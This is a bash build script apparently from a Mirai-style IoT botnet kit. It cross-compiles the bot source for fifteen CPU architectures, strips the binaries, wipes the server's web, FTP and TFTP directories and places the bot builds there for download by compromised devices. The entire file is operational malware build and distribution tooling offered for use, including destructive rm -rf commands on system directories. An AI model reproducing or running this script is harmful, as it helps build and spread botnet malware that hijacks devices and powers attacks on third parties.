``#!/bin/bash

export PATH=$PATH:/etc/xcompile/arc/bin
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i486/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin

export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -s -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
                                                                                                                                                                                                               
function arc_compile {
    "$1-linux-gcc" -DMIRAI_BOT_ARCH="$3" -std=c99 bot/*.c -s -o release/"$2"
}

function compile_armv7 {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}
                                                                                                                                                                                      
rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp

mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/bins

echo "Compiling - i486"
compile_bot i486 i486 "-static "

echo "Compiling - x86"
compile_bot i586 x86 "-static"

echo "Compiling - i686"
compile_bot i686 i686 "-static "

echo "Compiling - X86_64"
compile_bot x86_64 x86_64 "-static"

echo "Compiling - MIPS"
compile_bot mips mips "-static "

echo "Compiling - MIPSEL"
compile_bot mipsel mpsl "-static "

echo "Compiling - ARM/ARMv4"
compile_bot armv4l arm4 "-static "

echo "Compiling - ARMv5"
compile_bot armv5l arm5 "-static "

echo "Compiling - ARMv6"
compile_bot armv6l arm6 "-static"

echo "Compiling - ARMv7"
compile_armv7 armv7l arm7 "-static"

echo "Compiling - POWERPC"
compile_bot powerpc ppc "-static"

echo "Compiling - SPARC"
compile_bot sparc spc "-static"

echo "Compiling - M68K"
compile_bot m68k m68k "-static"

echo "Compiling - SH4"
compile_bot sh4 sh4 "-static"

echo "Compiling - ARC"
arc_compile arc arc "-static"

rm -rf /var/www/html/bins/*

cp release/* /var/www/html/bins
cp release/* /var/ftp
cp release/* /var/lib/tftpboot
rm -rf release

touch /var/www/html/index.html
touch /var/www/html/bins/index.html
